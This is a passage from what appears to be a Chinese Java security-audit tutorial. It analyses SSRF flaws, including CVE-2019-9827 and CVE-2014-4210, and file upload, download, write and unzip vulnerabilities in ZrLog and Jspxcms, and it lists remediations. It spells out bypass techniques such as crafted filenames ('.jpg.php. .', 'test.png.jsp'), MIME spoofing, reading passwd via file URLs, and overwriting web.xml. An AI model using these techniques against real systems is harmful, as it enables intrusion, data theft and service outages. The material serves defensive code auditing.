类。审计此漏洞时，首先应该确定被审计的源程序有哪些功能，通常情况下从其他服务器应用获取数据的功能出现的概率较大，确定好功能后再审计对应功能的源代码能使漏洞挖掘事半功倍。</p><p>下面将通过两段简单的代码来了解什么是 SSRF 漏洞，利用该漏洞能做什么，然后再通过一个 CVE 实例去深入了解 SSRF 漏洞。</p><h4 id="1．利用SSRF漏洞进行端口扫描"><a href="#1．利用SSRF漏洞进行端口扫描" class="headerlink" title="1．利用SSRF漏洞进行端口扫描"></a>1．利用SSRF漏洞进行端口扫描</h4><p>利用SSRF漏洞进行端口扫描的代码如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251620770.png" alt="image-20220425162025663"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251620558.png" alt="image-20220425162038457"></p><p>以上代码的大致意义如下。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">URL对象使用<span class="hljs-built_in">openconnection</span>()打开连接，获得URLConnection类对象。<br>使用<span class="hljs-built_in">InputStream</span>()获取字节流。<br>然后使用<span class="hljs-built_in">InputStreamReader</span>()将字节流转化成字符流。<br>使用<span class="hljs-built_in">BufferedReader</span>()将字符流以缓存形式输出的方式来快速获取网络数据流。<br>最终逐行输入 <span class="hljs-selector-tag">html</span> 变量中，输出到浏览器。<br>这段代码的主要功能是模拟一个http请求，如果没有对请求地址进行限制和过滤，即可以利用来进行 SSRF 攻击。<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">本机环境如下。<br>地址：<span class="hljs-number">127.0.0.1</span>。<br>环境：Java+Tomcat。<br>虚拟机环境如下。<br>地址：<span class="hljs-number">192.168.159.134</span>。<br>环境：PHP+Apache+Typecho。<br>假设外网可以访问本机地址，但不能访问虚拟机地址。<br></code></pre></td></tr></table></figure><p>如上所述，因为本机地址存在 SSRF 漏洞，所以可以利用该漏洞去探测虚拟机开放的端口，如图6-3所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251713126.png" alt="image-20220425171323009"></p><p>图6-3　SSRF测试端口成功界面</p><p>如果该端口没有开放http&#x2F;https协议，那么返回的内容如图6-4所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251714940.png" alt="image-20220425171413849"></p><p>图6-4　SSRF 测试端口失败界面</p><p>根据不同的返回结果，就可以判断开放的http&#x2F;https端口。</p><h4 id="2．利用-SSRF-漏洞进行任意文件读取"><a href="#2．利用-SSRF-漏洞进行任意文件读取" class="headerlink" title="2．利用 SSRF 漏洞进行任意文件读取"></a>2．利用 SSRF 漏洞进行任意文件读取</h4><p>将上述代码修改一部分，如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251717813.png" alt="image-20220425171746698"></p><p>Java 网络请求支持的协议有很多，包括http、https、file、ftp、mailto、jar、netdoc。而在实例化利用 SSRF 漏洞进行端口扫描中，HttpURLconnection() 是基于 http 协议的，我们要利用的是 file 协议，因此将其删除后即可利用 file 协议去读取任意文件，如图6-5所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251725606.png" alt="image-20220425172544421"></p><p>图6-5　利用 SSRF 读取 passwd 文件<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204251726684.png" alt="image-20220425172616894"></p><p>图6-6　利用SSRF读取数据库配置文件</p><h4 id="3．实际案例（CVE-2019-9827）分析"><a href="#3．实际案例（CVE-2019-9827）分析" class="headerlink" title="3．实际案例（CVE-2019-9827）分析"></a>3．实际案例（CVE-2019-9827）分析</h4><p>CVE-2019-9827是Hawtio的漏洞编号。Hawtio是用于管理Java应用程序的轻型模块化Web控制台。从官方通告中我们可以得知，HawtHawtio 小于2.5.0的版本都容易受到SSRF的攻击，远程攻击者可以通过&#x2F;proxy&#x2F; 地址发送特定的字符串，可以影响服务器到任意主机的http请求。</p><p>用户可以通过反编译hawtio-system-2.5.0.jar包获取本程序的源码，或者通过 GitHub 的 tree 分支来获取源码，在路径为hawtio-system&#x2F;src&#x2F;main&#x2F;java&#x2F;io&#x2F;hawt&#x2F;web&#x2F; proxy&#x2F;ProxyServlet. Java的文件中找到 service 函数，关键内容如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252214423.png" alt="image-20220425221455314"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252215299.png" alt="image-20220425221505199"></p><p>通过parseProxyAddress函数获取 URL 地址，然后判断其是否为空,如果不为空,则通过whitelist.isAllowed() 判断该 URL 是否在白名单里，跟进whitelist，其关键代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252215329.png" alt="image-20220425221553227"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252216379.png" alt="image-20220425221604267"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252216408.png" alt="image-20220425221620316"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252216827.png" alt="image-20220425221633703"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252229265.png" alt="image-20220425222905137"></p><p>判断 URL 是否为 localhost、127.0.0.1或者用户自己更新的白名单列表，如果不是则返回 false。</p><p>返回到 service()，继续向下执行，代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252259054.png" alt="image-20220425225948957"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252259446.png" alt="image-20220425225956344"></p><p>BasicHttpEntityEnclosingRequest() 拥有 RequestLine、HttpEntity 以及Header，这里使用的是 HttpEntity。HttpEntity 即消息体，包含了3种类型：数据流方式、自我包含方式以及封装模式（包含上述两种方式），这里就是一个基于 HttpEntity 的 HttpRequest接口实现，类似于上文中的urlConnection。</p><p>service() 的主要作用就是获取请求，然后 HttpService 把 HttpClient 传来的请求通过向下转型成 BasicHttpEntityEnclosingRequest ，再调用HttpEntity，最终得到请求流内容。</p><p>这里虽然对传入的 URL 进行了限制，但是没有对端口、协议进行相应的限制，从而导致了 SSRF 漏洞，如图6-7和图6-8所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252306778.png" alt="image-20220425230656630"></p><p>图6-7　hawtio 默认界面<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252307606.png" alt="image-20220425230707366"></p><p>图6-8　通过SSRF读取到内网其他Web 站点界面</p><p>在后续的版本中，官方采用了增加访问权限的方式修复SSRF漏洞，禁止未经验证的用户访问该页面，如图6-9和图6-10所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252307603.png" alt="image-20220425230721386"></p><p>图6-9　hawtio新版本对SSRF漏洞的修复方式<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252307079.png" alt="image-20220425230734943"></p><p>图6-10　修复SSRF漏洞后的测试图</p><p>SSRF 漏洞的修复方式有很多种，并不局限于增加访问权限，除此之外还有以下几种。</p><p>统一错误信息，避免用户根据错误信息来判断远端服务器的端口状态。限制请求的端口为http的常用端口，比如80、443、8080、8090等。禁用不需要的协议，仅仅允许http和https请求。根据业务需求，判定所需的域名是否是常用的几个，若是，则将这几个特定的域名加入白名单，并拒绝白名单域名之外的请求。根据请求来源，判定请求地址是否是固定请求来源，若是，则将这几个特定的域名&#x2F;IP添加到白名单，并拒绝白名单域名&#x2F;IP之外的请求。若业务需求和请求来源并不固定，则可以自己编写一个 ssrfCheck 函数，检测特定的域名、判断是否是内网IP、判断是否为http&#x2F;https协议等。</p><h4 id="4．实际案例Weblogic-SSRF漏洞（CVE-2014-4210）分析"><a href="#4．实际案例Weblogic-SSRF漏洞（CVE-2014-4210）分析" class="headerlink" title="4．实际案例Weblogic SSRF漏洞（CVE-2014-4210）分析"></a>4．实际案例Weblogic SSRF漏洞（CVE-2014-4210）分析</h4><p>Weblogic SSRF漏洞是一个比较经典的 SSRF漏洞案例，我做渗透测试工作时曾经遇到过许多次，该漏洞存在于<a href="http://127.0.0.1:7001/uddiexplorer/SearchPublic">http://127.0.0.1:7001/uddiexplorer/SearchPublic</a> Registries. jsp页面中，如图6-11所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252311642.png" alt="image-20220425231107534"></p><p>图6-11　Weblogic SSRF漏洞</p><p>Weblogic SSRF漏洞可以通过向服务端发送以下请求参数进行触发，如果该IP和端口存在并且开放，则返回以下信息，如图6-12所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252312342.png" alt="image-20220425231230256"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252313419.png" alt="image-20220425231345317"></p><p>图6-12　IP或端口存在且开放时返回的信息</p><p>如果该IP不存在或者端口不存在，则返回以下信息，如图6-13所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252314235.png" alt="image-20220425231402135"></p><p>图 6-13　IP或端口不存在时返回的信息</p><p>根据请求的URI可以看到请求的是SearchPublicRegistries.jsp，该文件的存储路径为user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F; uddiexplorer&#x2F;5f6ebw&#x2F;war&#x2F;SearchPublicRegistries.jsp。</p><p>从请求的URL中可以发现最关键的参数是&#x3D;&#x3D;operator&#x3D;&#x3D;参数，在SearchPublic Registries.JSP文件的第48行获取了该参数，如图6-14所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252316578.png" alt="image-20220425231604474"></p><p>图6-15　调用search.getResponse方法</p><p>getResponse方法的第65和66行分别调用了一个Http11ClientBinding对象的send方法和receive方法，当探测的IP存在且端口开放时，会在receive方法处抛出异常，异常类型为IOException。当探测的IP不存在或者端口不开放时，会在send方法处抛出异常，异常类型为IOException。如图6-16 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252322233.png" alt="image-20220425232207124"></p><p>图 6-16　调用send方法和receive方法</p><p>抛出的异常在第88行被封装成一个XML_SoapException对象返回给客户端，如图6-17所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252323179.png" alt="image-20220425232310084"></p><p>图6-17　XML_SoapException对象</p><p>异常内容就是var18.getMessage方法返回的结果，如图6-18所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204252323647.png" alt="image-20220425232326835"></p><p>图6-18　var18.getMessage方法返回的结果</p><h3 id="6-4-1-文件操作漏洞简介"><a href="#6-4-1-文件操作漏洞简介" class="headerlink" title="6.4.1　文件操作漏洞简介"></a>6.4.1　文件操作漏洞简介</h3><p>文件操作是 Java Web 的核心功能之一，其中常用的操作就是将服务器上的文件以流的形式在本地读写，或上传到网络上，Java中的File类就是对这些存储于磁盘上文件的虚拟映射。与我们在本地计算机上操作文件类似，Java对文件的操作同样包括上传、删除、读取、写入等。Java Web本身去实现这些功能是没有漏洞的，但是由于开发人员忽略了一些细节，导致攻击者可以利用这些细节通过文件操作Java Web 本身的这一个功能，从而实现形如任意文件上传、任意文件下载&#x2F;读取、任意文件删除等漏洞，有的场景下甚至可以利用文件解压实现目录穿越或拒绝服务攻击等，对服务器造成巨大的危害。</p><h3 id="6-4-2-漏洞发现与修复案例"><a href="#6-4-2-漏洞发现与修复案例" class="headerlink" title="6.4.2　漏洞发现与修复案例"></a>6.4.2　漏洞发现与修复案例</h3><h4 id="1．文件包含漏洞"><a href="#1．文件包含漏洞" class="headerlink" title="1．文件包含漏洞"></a>1．文件包含漏洞</h4><p>文件包含漏洞通常出现在由 PHP 编写的 Web应用中。我们知道在 PHP中，攻击者可以通过 PHP 中的某些包含函数，去包含一个含有攻击代码的恶意文件，在包含这个文件后，由于 PHP 包含函数的特性，无论包含的是什么类型的文件，都会将所包含的文件当作 PHP 代码去解析执行。也就是说，攻击者可能上传一个木马后缀是 txt 或者 jpg 的一句话文件，上传后利用文件包含漏洞去包含这个一句话木马文件就可以成功拿到Shell 了。</p><p>那么Java 中有没有类似的包含漏洞呢？回答这个问题前，我们首先来看一看 Java 中包含其他文件的方式。</p><p>JSP 的文件包含分为静态包含和动态包含两种。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">静态包含：%@include file=<span class="hljs-string">&quot;test.jsp&quot;</span>%。<br><br>动态包含：&lt;<span class="hljs-attr">jsp</span>:include page=<span class="hljs-string">&quot;&lt;%=file%&gt;&quot;</span>&gt;&lt;<span class="hljs-regexp">/jsp:include&gt;、&lt;c:import url=&quot;&lt;%= url%&gt;&quot;&gt;&lt;/</span><span class="hljs-attr">c</span>:<span class="hljs-keyword">import</span>&gt;。<br></code></pre></td></tr></table></figure><p>由于静态包含中file的参数不能动态赋值，因此我目前了解的静态包含不存在包含漏洞。相反，动态包含中的 file 的参数是可以动态赋值的，因此动态包含存在问题。但这种包含和 PHP 中的包含存在很大的差别，对于 Java 的本地文件包含来说，造成的危害只有文件读取或下载，一般情况下不会造成命令执行或代码执行。因为一般情况下 Java 中对于文件的包含并不是将非 JSP 文件当成 Java 代码去执行。如果这个 JSP 文件是一个一句话木马文件，我们可以直接去访问利用，并不需要多此一举去包含它来使用，&#x3D;&#x3D;除非在某些特殊场景下，如某些目录下权限不够，可以尝试利用包含来绕过&#x3D;&#x3D;。</p><p>通常情况下，Java 并不会把非 JSP 文件当成Java去解析执行，但是可以利用服务容器本身的一些特性（如将指定目录下的文件全部作为JSP文件解析），来实现任意后缀的文件包含，如 &#x3D;&#x3D;Apache Tomcat Ajp（CVE-2020-1938）&#x3D;&#x3D;漏洞，利用Tomcat 的AJP（定向包协议）实现了任意后缀名文件当成 JSP 文件去解析，从而导致RCE漏洞。</p><h4 id="2．文件上传漏洞"><a href="#2．文件上传漏洞" class="headerlink" title="2．文件上传漏洞"></a>2．文件上传漏洞</h4><p>文件上传漏洞是 Java 文件操作中比较常见的一种漏洞，是指攻击者利用系统缺陷绕过对文件的验证和处理，将恶意文件上传到服务器并进行利用。这种漏洞形成原因多样，危害巨大，往往可以通过文件上传直接拿到服务器的webshell。</p><p>引起文件上传漏洞的原因有很多，但大多数是对用户提交的数据进行检验或者过滤不严而导致的。下面我们通过几个简单的代码片段来讲解一些文件上传漏洞。</p><h5 id="（1）仅前端过滤导致的任意文件上传漏洞。"><a href="#（1）仅前端过滤导致的任意文件上传漏洞。" class="headerlink" title="（1）仅前端过滤导致的任意文件上传漏洞。"></a>（1）仅前端过滤导致的任意文件上传漏洞。</h5><p>由 JS 编写的前端过滤代码段如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204260946064.png" alt="image-20220426094652587"></p><p>对于攻击者来说，如果在后端对用户上传的文件没有检测过滤，那么所有的前端过滤代码都是徒劳。因为攻击者可以通过抓包改包的方式来修改上传给服务器的数据，从而绕过前端的限制。</p><p>就比如这个 写一个 “.jpg.php. .”(两个点中间有个空格)就能绕过</p><h5 id="2）后端过滤不严格导致的任意文件上传。"><a href="#2）后端过滤不严格导致的任意文件上传。" class="headerlink" title="2）后端过滤不严格导致的任意文件上传。"></a>2）后端过滤不严格导致的任意文件上传。</h5><p>后端过滤不严格的实际场景有很多，如后缀名过滤不严格、上传类型过滤不严格等。针对这两种原因，我们分别用示例代码来进行说明。</p><p>由上传类型过滤不严格导致的漏洞，示例代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261444847.png" alt="image-20220426144431723"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261444659.png" alt="image-20220426144442554"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261445472.png" alt="image-20220426144501789"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261445043.png" alt="image-20220426144527912"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261445261.png" alt="image-20220426144537145"></p><p>仔细阅读代码会发现，该上传代码片段针对上传文件的检测只有一个环节，即通过 checkMimeType() 函数来判断用户上传文件的 MimeType的类型是否为 image&#x2F;png 类型，若是，则上传成功；若不是，则会上传失败。这里开发者的思路是没有问题的，但出现的问题和由前端过滤导致的任意文件上传有异曲同工之妙，在checkMimeType() 函数中使用的是getContentType()方法来获取文件的 MimeType，攻击者可以通过这种方式在前端修改文件类型，从而绕过上传。如 JSP 类型文件的MimeType 是 text&#x2F;html，我们可以通过抓包改包的方式将其修改为image&#x2F;png 类型。</p><p>由后缀名过滤不严格导致的任意文件上传漏洞，示例代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261622701.png" alt="image-20220426162210584"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261622129.png" alt="image-20220426162225027"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261622141.png" alt="image-20220426162248029"></p><p>上述代码是一个文件上传的代码片段，该段代码针对上传文件的检验是后缀名，若后缀名为jsp，则不允许上传，否则可以上传。该检验机制采用的是黑名单方式，虽然机制正确，但是代码中出现了问题。开发者首先利用fileName.indexOf(“.”)去检测文件的后缀名，indexOf(“.”) 是从前往后取第一个点后的内容，如果攻击者上传的文件后缀名为test.png.jsp，则可以绕过该检测，通常我们取后缀名所用的函数为 lastIndexOf()。那么此处若将indexOf(“.”)替换成lastIndexOf(“.”)，是不是就不存在上传漏洞了呢？</p><p>答案是否定的，我们不但要求后缀名类型符合上传文件的要求，而且对于后缀名的大小写也要有所区分。这里的代码并未要求文件名的大小写统一，所以攻击者只需改变其上传文件的大小写，同样可以绕过该检测。</p><p>文件上传的检测是重中之重，任意文件上传漏洞给攻击者带来的危害是巨大的，因此对于安全审计者来说，上传漏洞是审计工作中的重点内容。审计者可以重点关注表 6-4所示的与任意文件上传漏洞相关的函数或类。</p><p>表6-4　与任意文件上传漏洞相关的函数或类<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261623471.png" alt="image-20220426162350361"></p><p>对于文件上传的防范或修复有以下几种方式。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">对于上传文件的后缀名截取校验时，忽略大小写，采用统一小写或大写的方式进行比对校验。<br><br>严格检测上传文件的类型，推荐采用白名单的形式来校验后缀名。<br><br><span class="hljs-keyword">Java版本小于jdk </span><span class="hljs-number">7</span>u40时可能存在截断漏洞，因此要注意 <span class="hljs-keyword">jdk </span>版本对程序的影响。<br><br>限制上传文件的大小和上传频率。<br><br>可以对上传的文件进行重命名、自定义后缀等。<br></code></pre></td></tr></table></figure><h4 id="3．文件下载-x2F-读取漏洞"><a href="#3．文件下载-x2F-读取漏洞" class="headerlink" title="3．文件下载&#x2F;读取漏洞"></a>3．文件下载&#x2F;读取漏洞</h4><p>与任意文件上传漏洞对应的是任意文件下载&#x2F;读取漏洞。在文件上传中我们通常用到的是 FileOutputStream，而在文件下载中，我们用到的通常是 FileInputStream。引发任意文件下载&#x2F;读取漏洞的原因通常是对传入的路径未做严格的校验，导致攻击者可以自定义路径，从而达到任意文件下载&#x2F;读取的效果，如下代码是一个任意文件下载漏洞的示例。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261630076.png" alt="image-20220426163057980"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261631915.png" alt="image-20220426163129801"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261631658.png" alt="image-20220426163146546"></p><p>可以看到，当服务端获取到 filename 参数后，未经任何校验，直接打开文件对象并创建文件输入流，攻击者只需在文件名中写入任意路径，就可以达到下载指定路径里的指定文件的目的。</p><p>对于任意文件下载&#x2F;读取的防范也比较简单。首先，我们可以将下载文件的路径和名称存储在数据库中或者对应编号，当有用户请求下载时，直接接受其传入的编号或名称，然后调用对应的文件下载即可。其次，在生成 File 文件类之前，开发者应该对用户传入的下载路径进行校验，判断该路径是否位于指定目录下，以及是否允许下载或读取。</p><h4 id="4．文件写入漏洞"><a href="#4．文件写入漏洞" class="headerlink" title="4．文件写入漏洞"></a>4．文件写入漏洞</h4><p>文件写入与文件上传比较相似，不同的是，文件写入并非真正要上传一个文件，而是将原本要上传的文件中的代码通过 Web 站点的某些功能直接写入服务器，如某些站点后台的“设置&#x2F;错误页面编辑”功能或 HTTPPUT 请求等。</p><p>下面我们通过 ZrLog 2.1.0 产品后台文件写入漏洞来了解这个漏洞。</p><p>ZrLog 是使用Java开发的博客程序。在 ZrLog 2.1.0产品后台存在文件写入漏洞，攻击者可以利用产品后台的“设置&#x2F;错误页面编辑”功能进行文件写入。通过利用可进行存储型XSS漏洞攻击，或替换 ZrLog 网站的配置文件 web.xml，致使网站崩溃；该漏洞出现的文件路径为：\zrlog\web\src\main\java\com\zrlog\web\controller\admin\api\TemplateController.java，具体位置如图6-21所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261823141.png" alt="image-20220426182257366"></p><p>图6-21　ZrLog漏洞位置</p><p>这段代码是网站管理员在网站后台的“设置&#x2F;错误页面编辑&#x2F;提交”处进行错误页面自定义的部分代码。可以发现file字符串由PathKit.getWebRootPath()和getPara (name:”file”)两个字符串拼接而成。其中 PathKit.getWebRootPath() 的返回值是网站根目录的路径。执行 getPara(“file”) 方法，如图6-22所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261825033.png" alt="image-20220426182511949"></p><p>图6-22　getPara(“file”) 方法</p><p>可以发现该方法的返回值是this.request.getParameter(name)，而this.request是javax.servlet.http.HttpServletRequest对象，如图6-23所示。</p><p>由此可见，这套CMS在进行“错误页面编辑”时，未经过任何过滤就进行了文件路径和文件名的拼接。</p><p>漏洞验证过程分为以下4步。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">（<span class="hljs-number">1</span>）攻击者登录ZrLog的管理后台。<br>（<span class="hljs-number">2</span>）攻击者使用<span class="hljs-keyword">Burp </span>Suite抓取“错误页面编辑”的数据包。<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261833977.png" alt="image-20220426183305706"></p><p>图6-23　javax.servlet.http.HttpServletRequest 对象</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">（<span class="hljs-number">3</span>）攻击者使用<span class="hljs-keyword">Burp </span>Suite修改“错误页面编辑”的数据包。<br>（<span class="hljs-number">4</span>）攻击者发送数据包。<br></code></pre></td></tr></table></figure><p>具体操作如下。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">（<span class="hljs-number">1</span>）攻击者登录ZrLog的管理后台。<br>（<span class="hljs-number">2</span>）攻击者使用<span class="hljs-keyword">Burp </span>Suite抓取“错误页面编辑”的数据包，如图<span class="hljs-number">6</span><span class="hljs-number">-24</span>所示。<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261836087.png" alt="image-20220426183650317"></p><p>图6-24　抓取“错误页面编辑”的数据包</p><p>由图6-24可以发现，攻击者可以在发送payload前更改文件名和文件内容。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">（<span class="hljs-number">3</span>）攻击者使用Burp Suite修改“错误页面编辑”的数据包，如进行包含恶意JavaScript脚本的<span class="hljs-selector-tag">HTML</span>文件写入。<br></code></pre></td></tr></table></figure><p>payload的关键如下：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261841466.png" alt="image-20220426184105100"></p><p>发送payload，如图6-25所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261842779.png" alt="image-20220426184225846"></p><p>图6-25　发送payload</p><p>在浏览器中访问<a href="http://192.168.114.238:8080/zrlog/error/safedog.html%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C%EF%BC%8C%E5%A6%82%E5%9B%BE6-26%E6%89%80%E7%A4%BA%E3%80%82![image-20220426184552040](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261845171.png)">http://192.168.114.238:8080/zrlog/error/safedog.html，查看攻击效果，如图6-26所示。![image-20220426184552040](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261845171.png)</a></p><p>图6-26　攻击效果</p><p>由图6-26可以发现，攻击者可以通过修改文件名和文件内容，进行存储型XSS攻击。最后我们只需要修改payload的路径信息，就可以达到使网站崩溃的效果，如以下payload：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261849533.png" alt="image-20220426184922225"></p><p>查看 ZrLog的web.xml内容，如图6-27所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261900074.png" alt="image-20220426190015952"></p><p>图6-27　查看ZrLog的web.xml内容</p><p>可以发现，web.xml 的内容被置空。</p><p>再访问 <a href="http://192.168.114.238:8080/zrlog/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%B7%B2%E7%BB%8F%E7%98%AB%E7%97%AA%E7%9A%84%E7%AB%99%E7%82%B9%EF%BC%8C%E5%A6%82%E5%9B%BE6-28%E6%89%80%E7%A4%BA%E3%80%82![image-20220426190206083](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261902194.png)">http://192.168.114.238:8080/zrlog/，可以看到已经瘫痪的站点，如图6-28所示。![image-20220426190206083](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261902194.png)</a></p><p>图6-28　已经瘫痪的站点</p><p>对于此类型漏洞的防护以及文件下载&#x2F;读取与任意文件上传类似。首先，就是要保证接收的路径不被用户控制，而且要对写入的内容进行校验；其次，文件写入漏洞一般利用的是源程序本身自带的功能，因此审计者对于此类型的漏洞进行审计时，要格外关注源程序是否具有写入文件的站点功能。此外 HTTP 请求中的 PUT 方法也可以创建并写入文件，例如比较经典的ActiveMQ任意文件写入漏洞（CVE-2016-3088）就是利用 PUT 方法写入文件；又例如 Apache Tomcat 7.0.0 – 7.0.81 版本中，如果开启了 PUT 功能，会导致Apache Tomcat任意文件上传漏洞（CVE-2017-12615），攻击者可以利用该漏洞创建并写入文件。</p><h4 id="5．文件解压漏洞"><a href="#5．文件解压漏洞" class="headerlink" title="5．文件解压漏洞"></a>5．文件解压漏洞</h4><p>文件解压是 Java 中一个比较常见的功能，但是该功能的安全问题往往也容易被忽视。由文件解压导致的漏洞五花八门，利用的效果也各有不同，如路径遍历、文件覆盖、拒绝服务、文件写入等。</p><p>下面通过Jspxcms-9.5.1由zip解压功能导致的目录穿越漏洞实例来说明文件解压漏洞。</p><p>Jspxcms是企业级开源网站内容管理系统，支持多组织、多站点、独立管理的网站群，也支持Oracle、SQL Server、MySQL等数据库。</p><p>Jspxcms-9.5.1及之前版本的后台ZIP文件解压功能存在目录穿越漏洞，攻击者可以利用该漏洞，构造包含恶意WAR包的ZIP文件，达到Getshell的破坏效果。</p><p>使用 Burp Suite进行抓包可以发现“解压文件”的接口调用情况，如图6-29所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261905315.png" alt="image-20220426190551177"></p><p>图6-29　解压文件接口调用</p><p>该接口对应jspxcms-9.5.1-release-src&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;jspxcms&#x2F;core&#x2F;web&#x2F;back&#x2F;WebFileUploadsController.java的unzip方法，如图6-30所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261906441.png" alt="image-20220426190647338"></p><p>图6-30　unzip方法</p><p>对unzip方法进行跟进，发现它的具体实现在&#x2F;jspxcms-9.5.1-release-src&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;jspxcms&#x2F;core&#x2F;web&#x2F;back&#x2F;WebFileControllerAbstractor.java中。在对ZIP文件进行解压时，程序调用了AntZipUtil类的unzip方法，如图6-31所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261912836.png" alt="image-20220426191220677"></p><p>图6-31　AntZipUtil类的unzip方法</p><p>对AntZipUtil类的unzip方法进行跟进，可发现该方法未对ZIP压缩包中的文件名进行参数校验就进行文件的写入。这样的代码写法会引发“目录穿越漏洞”，如图6-32所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204261914841.png" alt="image-20220426191451693"></p><p>图6-32　